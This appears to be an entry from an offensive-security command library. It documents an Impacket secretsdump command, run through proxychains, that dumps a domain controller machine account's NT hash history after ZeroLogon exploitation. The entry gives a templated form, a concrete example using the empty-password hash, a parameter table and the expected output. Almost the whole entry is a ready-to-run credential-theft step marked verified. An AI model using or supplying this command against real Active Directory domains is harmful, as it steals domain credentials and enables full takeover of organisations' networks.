---
id: 1f64ca16-3010-4572-bbd0-0bc16448fcf1
name: dump-dc-nt-hash-with-secretsdump
type: command
executor: bash
data: >-
  proxychains secretsdump.py -history -just-dc-user '$_DC_NAME$' -hashes
  :$_OLD_NT_HASH '$_DOMAIN/$_DC_NAME$@$_DC_FQDN'
output: null
created_at: '2023-04-06T03:56:02.673050+00:00'
updated_at: '2023-04-10T20:36:01.289773+00:00'
platforms:
  - Linux
tags:
  - secretsdump
  - hash-dump
verified: true
validated: true
---

# dump-dc-nt-hash-with-secretsdump

## Command

```bash
proxychains secretsdump.py -history -just-dc-user '$_DC_NAME$' -hashes :$_OLD_NT_HASH '$_DOMAIN/$_DC_NAME$@$_DC_FQDN'
```

## Description

Dumps the NT hash history for the DC machine account using the empty password post-exploit.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -history | Include password history | Yes |
| -just-dc-user | Target DC user only | Yes |
| $_DC_NAME$ | DC machine account (e.g., DC01$) | Yes |
| :$_OLD_NT_HASH | NT hash placeholder | Yes |
| $_DOMAIN/$_DC_NAME$@$_DC_FQDN | Target format | Yes |

## Examples

### Basic Usage

```bash
proxychains secretsdump.py -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'CORP/DC01$@DC01.CORP.LOCAL'
```

## Expected Output

```
DC01$:::{OLD_NT_HASH}
```

## Related

- [[procedures/ZeroLogon-Exploitation-and-Post-Exploitation]]
- [[tools/Impacket]]
